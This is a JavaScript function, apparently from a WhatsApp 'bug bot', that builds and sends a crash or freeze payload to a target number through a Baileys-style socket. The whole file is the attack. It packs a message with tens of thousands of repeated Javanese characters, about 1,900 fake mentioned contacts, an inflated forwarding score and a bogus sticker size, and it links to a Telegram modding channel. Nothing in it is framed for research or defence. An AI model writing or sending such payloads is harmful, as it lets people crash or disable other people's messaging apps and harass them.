async function Vcdelay(target) {
    const el = "ꦽ".repeat(50000);
    let q;
    let Msg;
    for (let i = 0; i < 1000; i++) {
        q = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                id: "MAIN-" + Math.floor(Math.random() * 999999999),
                participant: "0@s.whatsapp.net"
            },
            message: {
                conversation: "ꦽ".repeat(50000),
                extendedTextMessage: {
                    text: "ꦽ".repeat(50000),
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        ),
                        stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                        participant: "0@s.whatsapp.net"
                    }
                }
            }
        };
    }
    for (let i = 0; i < 1000; i++) {
        Msg = {
            call: {
                callType: 2,
                callId: String(Date.now()),
                callStartTimestamp: Date.now(),
                contextInfo: {
                    forwardingScore: 999999,
                    isForwarded: true,
                    stanzaId: "ctx-" + Date.now(),
                    participant: "0@s.whatsapp.net",
                    remoteJid: target,
                    mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        )
                    ],
                    entryPointConversionSource: "global_search_new_chat",
                    entryPointConversionApp: "com.whatsapp",
                    entryPointConversionDelaySeconds: 1,
                    quotedMessage: {
                        conversation: el,
                        stickerMessage: {
                            url: "https://files.catbox.moe/0pl5dp.jpg",
                            mimetype: "image/webp",
                            fileLength: "9999999"
                        },
                        urlTrackingMap: {
                            urlTrackingMapElements: [
                                {
                                    originalUrl: "https://t.me/ameliamodders",
                                    unconsentedUsersUrl: "https://t.me/ameliamodders",
                                    consentedUsersUrl: "https://t.me/ameliamodders",
                                    cardIndex: 1
                                },
                                {
                                    originalUrl: "https://t.me/ameliamodders",
                                    unconsentedUsersUrl: "https://t.me/ameliamodders",
                                    consentedUsersUrl: "https://t.me/ameliamodders",
                                    cardIndex: 2
                                }
                            ]
                        }
                    }
                }
            }
        };
    }
    await sock.relayMessage(target, Msg, { quote: q });
}